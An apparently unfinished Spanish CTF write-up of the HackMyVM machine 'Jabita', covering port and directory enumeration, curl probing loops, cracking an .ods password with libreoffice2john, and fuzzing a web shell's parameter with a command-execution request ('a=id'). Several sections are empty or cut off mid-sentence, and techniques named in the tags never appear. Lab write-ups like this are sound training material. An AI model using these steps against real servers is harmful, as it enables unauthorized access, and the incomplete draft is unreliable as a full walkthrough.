---
title:      "Jabita"
excerpt:    "Hoy vamos a realizar la primera máquina de un compañero de la comunidad de HackMyVM, Rijaba1. Emplearemos un par de técnicas nuevas que aún no habíamos visto en el blog."
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/arroutada/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Easy
  - Linux
  - Directory traversal
  - Brute force
  - Fuzzing
  - Python library hijacking
  - Sudo abuse
---

![](/assets/images/arroutada/prev.png){: .align-center}

Hoy vamos a realizar la primera máquina de un compañero de la comunidad de HackMyVM, Rijaba1. Emplearemos un par de técnicas nuevas que aún no habíamos visto en el blog.


## Reconocimiento de Puertos

En primer lugar averiguamos la IP de la máquina víctima:

~~~bash
❯ sudo arp-scan -l | grep "PCS"
192.168.1.135 08:00:27:4a:fe:69 PCS Systemtechnik GmbH
~~~

Ahora definimos la IP en una variable para no tener que escribirla todo el rato, y realizamos el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:

~~~bash
❯ ./nmapauto.sh $ip

 [*] Reconocimiento inicial de puertos

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 18:44 CET
Initiating Ping Scan at 18:44
Scanning 192.168.1.135 [2 ports]
Completed Ping Scan at 18:44, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 18:44
Scanning 192.168.1.135 [65535 ports]
Discovered open port 80/tcp on 192.168.1.135
Completed Connect Scan at 18:44, 3.32s elapsed (65535 total ports)
Nmap scan report for 192.168.1.135
Host is up (0.00031s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.37 seconds

 [*] Escaneo avanzado de servicios

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 18:44 CET
Nmap scan report for 192.168.1.135
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos
 ~~~

Aquí no tenemos más remedio que irnos al puerto 80 jeje, así que vamos a ver qué nos muestra:

![](/assets/images/arroutada/index.png){: .align-center}

Solamente hay una imagen .png y en el 




~~~bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x php,txt,html -u $ip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.135
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/01/19 18:50:10 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/imgs                 (Status: 301) [Size: 313] [--> http://192.168.1.135/imgs/]
/scout                (Status: 301) [Size: 314] [--> http://192.168.1.135/scout/]
/server-status        (Status: 403) [Size: 278]                                  
                                                                                 
===============================================================
2023/01/19 18:51:35 Finished
===============================================================
~~~

En */imgs* solo está la imagen del index, pero en */scout* hay algo interesante:

![](/assets/images/arroutada/scout.png){: .align-center}

Vamos a fuzzear en ese directorio:

~~~bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x php,txt,html -u $ip/scout
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.135/scout
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/01/19 18:56:48 Starting gobuster in directory enumeration mode
===============================================================
/html                 (Status: 301) [Size: 319] [--> http://192.168.1.135/scout/html/]
/java                 (Status: 301) [Size: 319] [--> http://192.168.1.135/scout/java/]
/links                (Status: 301) [Size: 320] [--> http://192.168.1.135/scout/links/]
/1                    (Status: 301) [Size: 316] [--> http://192.168.1.135/scout/1/]    
/img                  (Status: 301) [Size: 318] [--> http://192.168.1.135/scout/img/]  
/exploits             (Status: 301) [Size: 323] [--> http://192.168.1.135/scout/exploits/]
/download             (Status: 301) [Size: 323] [--> http://192.168.1.135/scout/download/]
/content              (Status: 301) [Size: 322] [--> http://192.168.1.135/scout/content/] 
/index.html           (Status: 200) [Size: 779]                                           
/scan                 (Status: 301) [Size: 319] [--> http://192.168.1.135/scout/scan/]    
/data                 (Status: 301) [Size: 319] [--> http://192.168.1.135/scout/data/]    
/j1                   (Status: 301) [Size: 317] [--> http://192.168.1.135/scout/j1/]      
/j2                   (Status: 301) [Size: 317] [--> http://192.168.1.135/scout/j2/]      
/bye                  (Status: 301) [Size: 318] [--> http://192.168.1.135/scout/bye/]     
/spell                (Status: 301) [Size: 320] [--> http://192.168.1.135/scout/spell/]   
                                                                                          
===============================================================
2023/01/19 18:58:15 Finished
===============================================================
~~~

Bien, encontramos nuevos recursos, por lo que vamos a guardarlos en un fichero y dejar solamente los directorios (se podría copiar con ctrl+alt la selección con Kitty, pero lo haremos como si no la usáramos):

~~~bash
❯ nano dir.txt
❯ cut -d "" -f1 < dir.txt > dict
~~~

Crearemos un pequeño script para que haga el chequeo de eses directorios tal y como nos daba la pista.

~~~bash
#!/bin/bash

while IFS= read -r line
do
   curl http://192.168.1.135/scout$line/docs >> curl.txt
done < dict
~~~

~~~bash
#!/bin/bash

for x in {1..999}; do
    curl http://192.168.1.135/scout/j2/docs/z$x >> resultado
done 
~~~

~~~
python3 /usr/share/john/libreoffice2john.py shellfile.ods > hash
~~~



~~~
❯ gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u "$ip/thejabasshell.php?a=id&b=FUZZ" -b 400 --exclude-length 33
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.135/thejabasshell.php?a=id&b=FUZZ
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Excluded Status codes:   400
[+] Exclude Length:          33
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/20 03:05:43 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=54] http://192.168.1.135/thejabasshell.php?a=id&b=pass
~~~

La contraseña del fichero shellfile.ods es john11
El usuario es Jabatito